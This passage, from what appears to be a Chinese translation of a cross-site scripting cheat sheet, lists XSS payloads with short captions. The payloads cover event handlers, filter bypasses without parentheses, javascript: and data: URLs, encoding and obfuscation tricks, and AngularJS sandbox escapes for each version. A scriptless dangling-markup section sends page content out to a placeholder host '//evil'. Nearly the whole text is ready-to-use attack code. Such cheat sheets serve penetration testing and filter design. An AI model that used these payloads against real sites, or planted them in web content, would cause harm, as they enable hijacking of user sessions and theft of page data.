ontransitionend=alert(1)&gt;&lt;/a&gt;</code></pre><p>CSS过渡开始时触发（Firefox)</p><pre><code>&lt;style&gt;:target {transform: rotate(180deg);}&lt;/style&gt;&lt;a id=x style=&quot;transition:transform 2s&quot; ontransitionrun=alert(1)&gt;&lt;/a&gt;</code></pre><p>未履行承诺时触发（Firefox)</p><pre><code>&lt;body onunhandledrejection=alert(1)&gt;&lt;script&gt;fetch(&#39;//xyz&#39;)&lt;/script&gt;</code></pre><p>等待数据时触发（IE）</p><pre><code>&lt;video autoplay controls onwaiting=alert(1)&gt;&lt;source src=&quot;validvideo.mp4&quot; type=video/mp4&gt;&lt;/video&gt;</code></pre><h5 id="需要用户交互的事件处理程序"><a href="#需要用户交互的事件处理程序" class="headerlink" title="需要用户交互的事件处理程序"></a>需要用户交互的事件处理程序</h5><p>右键单击或使用鼠标中键时触发（Chrome、Firefox)</p><pre><code>&lt;input onauxclick=alert(1)&gt;</code></pre><p>需要复制一段文字（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onbeforecopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>要求剪切一段文字（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onbeforecut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>需要粘贴一段文字（IE）</p><pre><code>&lt;a onbeforepaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>需要属性值的变化（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;input onchange=alert(1) value=xss&gt;</code></pre><p>需要点击一下元素（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onclick=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>右键单击以显示上下文菜单时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a oncontextmenu=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>需要复制一段文字（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a oncopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>要求剪切一段文字（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a oncut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>双击元素时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a ondblclick=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>触发拖动元素（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a draggable=&quot;true&quot; ondrag=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>触发拖动已在元素上完成（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a draggable=&quot;true&quot; ondragend=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>需要鼠标拖动（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a draggable=&quot;true&quot; ondragenter=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>需要鼠标拖动（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a draggable=&quot;true&quot; ondragleave=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>触发拖动元素（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;a ondragover=alert(1) contenteditable&gt;drop here&lt;/a&gt;</code></pre><p>需要鼠标拖动（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a draggable=&quot;true&quot; ondragstart=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>触发删除可拖动元素（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;a ondrop=alert(1) contenteditable&gt;drop here&lt;/a&gt;</code></pre><p>需要作为价值的变化（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;input oninput=alert(1) value=xss&gt;</code></pre><p>需要具有不满足其约束的元素（例如必填属性）的表单提交。（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;form&gt;&lt;input oninvalid=alert(1) required&gt;&lt;input type=submit&gt;</code></pre><p>按下键时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onkeydown=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>按下键时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onkeypress=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>释放按键时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onkeyup=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>按下鼠标时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onmousedown=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>当鼠标悬停在元素上时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onmouseenter=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onmouseleave=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>需要鼠标移动（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onmousemove=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onmouseout=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>需要将鼠标悬停在元素上（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onmouseover=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>释放鼠标按钮时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onmouseup=&quot;alert(1)&quot;&gt;test&lt;/a&gt;</code></pre><p>需要粘贴一段文字（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;a onpaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>需要点击元素才能暂停（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio autoplay controls onpause=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>需要点击（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;form onreset=alert(1)&gt;&lt;input type=reset&gt;</code></pre><p>提交表单并且输入具有搜索的type属性时触发（Chrome）</p><pre><code>&lt;form&gt;&lt;input type=search onsearch=alert(1) value=&quot;Hit return&quot; autofocus&gt;</code></pre><p>需要点击元素时间轴（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio autoplay controls onseeked=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>需要点击元素时间轴（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio autoplay controls onseeking=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>需要选择文字（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;input onselect=alert(1) value=&quot;XSS&quot; autofocus&gt;</code></pre><p>需要提交表单（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;</code></pre><p>需要在页面上的任意位置单击并重新加载（Chrome)</p><pre><code>&lt;svg onunload=window.open(&#39;javascript:alert(1)&#39;)&gt;</code></pre><p>需要调节音量（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio autoplay controls onvolumechange=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>使用鼠标滚轮时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;body onwheel=alert(1)&gt;</code></pre><h4 id="限制字符"><a href="#限制字符" class="headerlink" title="限制字符"></a>限制字符</h4><p>无括号，使用异常处理</p><pre><code>&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;</code></pre><p>无括号，无分号，使用异常处理</p><pre><code>&lt;script&gt;{onerror=alert}throw 1&lt;/script&gt;</code></pre><p>无括号的异常处理，没有使用表达式的半冒号</p><pre><code>&lt;script&gt;throw onerror=alert,1&lt;/script&gt;</code></pre><p>无括号异常处理和evil</p><pre><code>&lt;script&gt;throw onerror=eval,&#39;=alert\x281\x29&#39;&lt;/script&gt;</code></pre><p>无括号，在Firefox上使用异常处理和evil</p><pre><code>&lt;script&gt;{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:&#39;alert\x281\x29&#39;}&lt;/script&gt;</code></pre><p>无括号，使用ES6 hasInstance和instanceof与eval</p><pre><code>&lt;script&gt;&#39;alert\x281\x29&#39;instanceof{[Symbol.hasInstance]:eval}&lt;/script&gt;</code></pre><p>无括号，使用ES6的hasInstance和instanceof以及eval</p><pre><code>&lt;script&gt;&#39;alert\x281\x29&#39;instanceof{[Symbol[&#39;hasInstance&#39;]]:eval}&lt;/script&gt;</code></pre><p>无括号，使用位置重定向</p><pre><code>&lt;script&gt;location=&#39;javascript:alert\x281\x29&#39;&lt;/script&gt;</code></pre><p>无字符串，使用位置没有括号重定向</p><pre><code>&lt;script&gt;location=name&lt;/script&gt;</code></pre><p>无括号，使用模板字符串</p><pre><code>&lt;script&gt;alert`1`&lt;/script&gt;</code></pre><h4 id="前端框架"><a href="#前端框架" class="headerlink" title="前端框架"></a>前端框架</h4><p>Bootstrap onanimationstart事件</p><pre><code>&lt;xss class=progress-bar-animated onanimationstart=alert(1)&gt;</code></pre><p>Bootstrap ontransitionend事件</p><pre><code>&lt;xss class=&quot;carousel slide&quot; data-ride=carousel data-interval=100 ontransitionend=alert(1)&gt;&lt;xss class=carousel-inner&gt;&lt;xss class=&quot;carousel-item active&quot;&gt;&lt;/xss&gt;&lt;xss class=carousel-item&gt;&lt;/xss&gt;&lt;/xss&gt;&lt;/xss&gt;</code></pre><h4 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h4><p>iframe src属性JavaScript协议</p><pre><code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>具有JavaScript协议的对象data属性</p><pre><code>&lt;object data=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>使用JavaScript协议嵌入src属性</p><pre><code>&lt;embed src=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>标准的JavaScript协议</p><pre><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>不区分大小写的协议</p><pre><code>&lt;a href=&quot;JaVaScript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>协议之前允许使用字符\x01- \x20</p><pre><code>&lt;a href=&quot;     javascript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>协议中允许使用字符\ x09，\x0a，\x0d</p><pre><code>&lt;a href=&quot;javas    cript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>协议名称后在冒号前允许字符\x09，\x0a，\x0d</p><pre><code>&lt;a href=&quot;javas  cript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>带有JavaScript协议的SVG中的Xlink命名空间</p><pre><code>&lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(1)&quot;&gt;&lt;text x=&quot;20&quot; y=&quot;20&quot;&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre><p>使用值的SVG动画标签</p><pre><code>&lt;svg&gt;&lt;animate xlink:href=#xss attributeName=href values=javascript:alert(1) /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre><p>SVG动画标签用于</p><pre><code>&lt;svg&gt;&lt;animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre><p>SVG设置标签</p><pre><code>&lt;svg&gt;&lt;set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre><p>脚本src中的数据协议</p><pre><code>&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;</code></pre><p>SVG脚本href属性，无需关闭脚本标签</p><pre><code>&lt;svg&gt;&lt;script href=&quot;data:text/javascript,alert(1)&quot; /&gt;</code></pre><p>SVG使用元素Chrome/Firefox</p><pre><code>&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml,&lt;svg id=&#39;x&#39; xmlns=&#39;http://www.w3.org/2000/svg&#39; xmlns:xlink=&#39;http://www.w3.org/1999/xlink&#39; width=&#39;100&#39; height=&#39;100&#39;&gt;&lt;a xlink:href=&#39;javascript:alert(1)&#39;&gt;&lt;rect x=&#39;0&#39; y=&#39;0&#39; width=&#39;100&#39; height=&#39;100&#39; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</code></pre><p>带有数据URL的导入语句</p><pre><code>&lt;script&gt;import(&#39;data:text/javascript,alert(1)&#39;)&lt;/script&gt;</code></pre><p>具有JavaScript协议的基本标记重写了相对URL</p><pre><code>&lt;base href=&quot;javascript:/a/-alert(1)///////&quot;&gt;&lt;a href=../lol/safari.html&gt;test&lt;/a&gt;</code></pre><p>MathML使任何标签都可点击</p><pre><code>&lt;math&gt;&lt;x href=&quot;javascript:alert(1)&quot;&gt;blah</code></pre><p>按钮和动作</p><pre><code>&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;XSS</code></pre><p>输入和形式</p><pre><code>&lt;form&gt;&lt;input type=submit formaction=javascript:alert(1) value=XSS&gt;</code></pre><p>形式与行动</p><pre><code>&lt;form action=javascript:alert(1)&gt;&lt;input type=submit value=XSS&gt;</code></pre><p>Isindex和formaction</p><pre><code>&lt;isindex type=submit formaction=javascript:alert(1)&gt;</code></pre><p>index和action</p><pre><code>&lt;isindex type=submit action=javascript:alert(1)&gt;</code></pre><p>将元素与外部网址一起使用</p><pre><code>&lt;svg&gt;&lt;use href=&quot;//subdomain1.portswigger-labs.net/use_element/upload.php#x&quot; /&gt;&lt;/svg&gt;</code></pre><h4 id="其他有用的属性"><a href="#其他有用的属性" class="headerlink" title="其他有用的属性"></a>其他有用的属性</h4><p>使用srcdoc属性</p><pre><code>&lt;iframe srcdoc=&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p>对实体使用srcdoc</p><pre><code>&lt;iframe srcdoc=&quot;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p>在页面上的任何位置（甚至在表单外部）单击提交元素</p><pre><code>&lt;form action=&quot;javascript:alert(1)&quot;&gt;&lt;input type=submit id=x&gt;&lt;/form&gt;&lt;label for=x&gt;XSS&lt;/label&gt;</code></pre><p>隐藏的输入：访问键属性可以在通常无法利用的元素上启用XSS</p><pre><code>&lt;input type=&quot;hidden&quot; accesskey=&quot;X&quot; onclick=&quot;alert(1)&quot;&gt; (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)</code></pre><p>链接元素：访问键属性可以在通常无法利用的元素上启用XSS</p><pre><code>&lt;link rel=&quot;canonical&quot; accesskey=&quot;X&quot; onclick=&quot;alert(1)&quot; /&gt; (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)</code></pre><p>下载属性可以保存当前网页的副本</p><pre><code>&lt;a href=# download=&quot;filename.html&quot;&gt;Test&lt;/a&gt;</code></pre><p>使用Referrerpolicy禁用引荐来源网址</p><pre><code>&lt;img referrerpolicy=&quot;no-referrer&quot; src=&quot;//portswigger-labs.net&quot;&gt;</code></pre><h4 id="特殊标签"><a href="#特殊标签" class="headerlink" title="特殊标签"></a>特殊标签</h4><p>重定向到其他域</p><pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=//portswigger-labs.net&quot;&gt;</code></pre><p>元字符集属性UTF-7</p><pre><code>&lt;meta charset=&quot;UTF-7&quot; /&gt; +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre><p>元字符集UTF-7</p><pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-7&quot; /&gt; +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre><p>UTF-7 BOM字符（必须在文档开头）1</p><pre><code>+/v8+ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre><p>UTF-7 BOM字符（必须在文档开头）2</p><pre><code>+/v9+ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre><p>UTF-7 BOM字符（必须在文档开头）3</p><pre><code>+/v++ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre><p>UTF-7 BOM字符（必须在文档开头）4</p><pre><code>+/v/+ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre><p>升级不安全的请求</p><pre><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot;&gt;</code></pre><p>通过iframe沙箱禁用JavaScript</p><pre><code>&lt;iframe sandbox src=&quot;//portswigger-labs.net&quot;&gt;&lt;/iframe&gt;</code></pre><p>禁用引荐来源</p><pre><code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code></pre><h4 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h4><p>超长UTF-8</p><pre><code>%C0%BCscript&gt;alert(1)&lt;/script&gt;%E0%80%BCscript&gt;alert(1)&lt;/script&gt;%F0%80%80%BCscript&gt;alert(1)&lt;/script&gt;%F8%80%80%80%BCscript&gt;alert(1)&lt;/script&gt;%FC%80%80%80%80%BCscript&gt;alert(1)&lt;/script&gt;</code></pre><p>Unicode转义</p><pre><code>&lt;script&gt;\u0061lert(1)&lt;/script&gt;</code></pre><p>Unicode转义ES6样式</p><pre><code>&lt;script&gt;\u{61}lert(1)&lt;/script&gt;</code></pre><p>Unicode转义ES6样式零填充</p><pre><code>&lt;script&gt;\u{0000000061}lert(1)&lt;/script&gt;</code></pre><p>十六进制编码JavaScript转义</p><pre><code>&lt;script&gt;eval(&#39;\x61lert(1)&#39;)&lt;/script&gt;</code></pre><p>八进制编码</p><pre><code>&lt;script&gt;eval(&#39;\141lert(1)&#39;)&lt;/script&gt;&lt;script&gt;eval(&#39;alert(\061)&#39;)&lt;/script&gt;&lt;script&gt;eval(&#39;alert(\61)&#39;)&lt;/script&gt;</code></pre><p>带有可选分号的十进制编码</p><pre><code>&lt;a href=&quot;&amp;#106;avascript:alert(1)&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;&amp;#106avascript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>带有HTML编码的SVG脚本</p><pre><code>&lt;svg&gt;&lt;script&gt;&amp;#97;lert(1)&lt;/script&gt;&lt;/svg&gt;&lt;svg&gt;&lt;script&gt;&amp;#x61;lert(1)&lt;/script&gt;&lt;/svg&gt;&lt;svg&gt;&lt;script&gt;alert&amp;NewLine;(1)&lt;/script&gt;&lt;/svg&gt;&lt;svg&gt;&lt;script&gt;x=&quot;&amp;quot;,alert(1)//&quot;;&lt;/script&gt;&lt;/svg&gt;</code></pre><p>带填充零的十进制编码</p><pre><code>&lt;a href=&quot;&amp;#0000106avascript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>十六进制编码实体</p><pre><code>&lt;a href=&quot;&amp;#x6a;avascript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>如果下一个字符不是a-f0-9，则不使用分号的十六进制编码</p><pre><code>&lt;a href=&quot;j&amp;#x61vascript:alert(1)&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;&amp;#x6aavascript:alert(1)&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;&amp;#x6a avascript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>带填充零的十六进制编码</p><pre><code>&lt;a href=&quot;&amp;#x0000006a;avascript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>十六进制编码不区分大小写</p><pre><code>&lt;a href=&quot;&amp;#X6A;avascript:alert(1)&quot;&gt;XSS&lt;/a&gt;</code></pre><p>HTML实体</p><pre><code>&lt;a href=&quot;javascript&amp;colon;alert(1)&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;java&amp;Tab;script:alert(1)&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;java&amp;NewLine;script:alert(1)&quot;&gt;XSS&lt;/a&gt;&lt;a href=&quot;javascript&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;&gt;XSS&lt;/a&gt;</code></pre><p>网址编码</p><pre><code>&lt;a href=&quot;javascript:x=&#39;%27-alert(1)-%27&#39;;&quot;&gt;XSS&lt;/a&gt;</code></pre><p>HTML实体和URL编码</p><pre><code>&lt;a href=&quot;javascript:x=&#39;&amp;percnt;27-alert(1)-%27&#39;;&quot;&gt;XSS&lt;/a&gt;</code></pre><h4 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h4><p>Firefox在＆之后允许NULL</p><pre><code>&lt;a href=&quot;javascript&amp;#x6a;avascript:alert(1)&quot;&gt;Firefox&lt;/a&gt;</code></pre><p>Firefox允许在命名实体内使用NULL</p><pre><code>&lt;a href=&quot;javascript&amp;colon;alert(1)&quot;&gt;Firefox&lt;/a&gt;</code></pre><p>Firefox在开头的注释中允许使用NULL字符</p><pre><code>&lt;!-- &gt;&lt;img title=&quot;--&gt;&lt;iframe/onload=alert(1)&gt;&quot;&gt; --&gt;&lt;!-- &gt;&lt;img title=&quot;--&gt;&lt;iframe/onload=alert(1)&gt;&quot;&gt; --&gt;</code></pre><p>带有base64的脚本src中的数据协议</p><pre><code>&lt;script src=data:text/javascript;base64,YWxlcnQoMSk=&gt;&lt;/script&gt;</code></pre><h4 id="客户端模板注入"><a href="#客户端模板注入" class="headerlink" title="客户端模板注入"></a>客户端模板注入</h4><h5 id="AngularJS沙箱逃逸"><a href="#AngularJS沙箱逃逸" class="headerlink" title="AngularJS沙箱逃逸"></a>AngularJS沙箱逃逸</h5><p>版本：1.0.1-1.1.5</p><pre><code>{{constructor.constructor('alert(1)')()}}</code></pre><p>版本：1.0.1-1.1.5（较短）</p><pre><code>{{$on.constructor('alert(1)')()}}</code></pre><p>版本：1.2.0-1.2.1</p><pre><code>{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}</code></pre><p>版本：1.2.2-1.2.5</p><pre><code>{{{}.")));alert(1)//"}}</code></pre><p>版本：1.2.6-1.2.18</p><pre><code>{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}</code></pre><p>版本：1.2.19-1.2.23</p><pre><code>{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}</code></pre><p>版本：1.2.24-1.2.29</p><pre><code>{{{}.")));alert(1)//"}}</code></pre><p>版本：1.2.27-1.2.29/1.3.0-1.3.20</p><pre><code>{{{}.")));alert(1)//"}}</code></pre><p>版本：1.3.0</p><pre><code>{{!ready && (ready = true) && (!call? $$watchers[0].get(toString.constructor.prototype): (a = apply) &&(apply = constructor) &&(valueOf = call) &&(''+''.toString('F = Function.prototype;' +'F.apply = F.a;' +'delete F.a;' +'delete F.valueOf;' +'alert(1);')));}}</code></pre><p>版本：1.3.3-1.3.18</p><pre><code>{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}</code></pre><p>版本：1.3.19</p><pre><code>{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}</code></pre><p>版本：1.3.20</p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}</code></pre><p>版本：1.4.0-1.4.9</p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></pre><p>版本：1.5.0-1.5.8</p><pre><code>{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}</code></pre><p>版本：1.5.9-1.5.11</p><pre><code>{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}</code></pre><p>版本：&gt; = 1.6.0</p><pre><code>{{constructor.constructor('alert(1)')()}}</code></pre><p>版本：&gt; = 1.6.0（较短）</p><pre><code>{{$on.constructor('alert(1)')()}}</code></pre><h5 id="基于DOM的AngularJS沙箱逃逸"><a href="#基于DOM的AngularJS沙箱逃逸" class="headerlink" title="基于DOM的AngularJS沙箱逃逸"></a>基于DOM的AngularJS沙箱逃逸</h5><p>所有版本（Chrome）</p><pre><code>&lt;input autofocus ng-focus=&quot;$event.path|orderBy:&#39;[].constructor.from([1],alert)&#39;&quot;&gt;</code></pre><p>所有版本（Chrome）较短</p><pre><code>&lt;input id=x ng-focus=$event.path|orderBy:&#39;(z=alert)(1)&#39;&gt;</code></pre><p>所有版本（所有浏览器）都较短</p><pre><code>&lt;input autofocus ng-focus=&quot;$event.composedPath()|orderBy:&#39;[].constructor.from([1],alert)&#39;&quot;&gt;</code></pre><p>版本：1.2.0-1.5.0</p><pre><code>&lt;div ng-app ng-csp&gt;&lt;div ng-focus=&quot;x=$event;&quot; id=f tabindex=0&gt;foo&lt;/div&gt;&lt;div ng-repeat=&quot;(key, value) in x.view&quot;&gt;&lt;div ng-if=&quot;key == &#39;window&#39;&quot;&gt;{{ [1].reduce(value.alert, 1); }}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h4 id="无脚本攻击"><a href="#无脚本攻击" class="headerlink" title="无脚本攻击"></a>无脚本攻击</h4><p>背景属性</p><pre><code>&lt;body background=&quot;//evil?&lt;table background=&quot;//evil?&lt;table&gt;&lt;thead background=&quot;//evil?&lt;table&gt;&lt;tbody background=&quot;//evil?&lt;table&gt;&lt;tfoot background=&quot;//evil?&lt;table&gt;&lt;td background=&quot;//evil?&lt;table&gt;&lt;th background=&quot;//evil?</code></pre><p>链接href样式表</p><pre><code>&lt;link rel=stylesheet href=&quot;//evil?</code></pre><p>链接href图标</p><pre><code>&lt;link rel=icon href=&quot;//evil?</code></pre><p>Meta刷新</p><pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; http://evil?</code></pre><p>Img通过src属性传递标记</p><pre><code>&lt;img src=&quot;//evil?&lt;image src=&quot;//evil?</code></pre><p>使用track元素的视频</p><pre><code>&lt;video&gt;&lt;track default src=&quot;//evil?</code></pre><p>使用sourcr元素和src属性的视频</p><pre><code>&lt;video&gt;&lt;source src=&quot;//evil?</code></pre><p>使用source元素和src属性的音频</p><pre><code>&lt;audio&gt;&lt;source src=&quot;//evil?</code></pre><p>输入src</p><pre><code>&lt;input type=image src=&quot;//evil?</code></pre><p>使用formaction的按钮</p><pre><code>&lt;form&gt;&lt;button style=&quot;width:100%;height:100%&quot; type=submit formaction=&quot;//evil?</code></pre><p>使用formaction输入</p><pre><code> &lt;form&gt;&lt;input type=submit value=&quot;XSS&quot; style=&quot;width:100%;height:100%&quot; type=submit formaction=&quot;//evil?</code></pre><p>表单使用action</p><pre><code>&lt;button form=x style=&quot;width:100%;height:100%;&quot;&gt;&lt;form id=x action=&quot;//evil?</code></pre><p>使用src属性的Isindex</p><pre><code>&lt;isindex type=image src=&quot;//evil?</code></pre><p>Isindex使用submit</p><pre><code>&lt;isindex type=submit style=width:100%;height:100%; value=XSS formaction=&quot;//evil?</code></pre><p>Object data</p><pre><code>&lt;object data=&quot;//evil?</code></pre><p>iframe src</p><pre><code>&lt;iframe src=&quot;//evil?</code></pre><p>Embed src</p><pre><code>&lt;embed src=&quot;//evil?</code></pre><p>使用textarea标记并发布到外部站点</p><pre><code>&lt;form&gt;&lt;button formaction=//evil&gt;XSS&lt;/button&gt;&lt;textarea name=x&gt;</code></pre><p>使用表单目标通过window.name传递标记数据</p><pre><code>&lt;button form=x&gt;XSS&lt;/button&gt;&lt;form id=x action=//evil target=&#39;</code></pre><p>使用基本目标通过window.name传递标记数据</p><pre><code>&lt;a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html&gt;&lt;font size=100 color=red&gt;You must click me&lt;/font&gt;&lt;/a&gt;&lt;base target=&quot;</code></pre><p>使用formtarget通过window.name传递标记数据</p><pre><code>&lt;form&gt;&lt;input type=submit value=&quot;Click me&quot; formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=&quot;</code></pre><p>使用基本href传递数据</p><pre><code>&lt;a href=abc style=&quot;width:100%;height:100%;position:absolute;font-size:1000px;&quot;&gt;xss&lt;base href=&quot;//evil/</code></pre><p>使用embed src从页面传递数据</p><pre><code>&lt;embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;</code></pre><p>使用iframe窗口名称从页面传递数据</p><pre><code>&lt;iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html 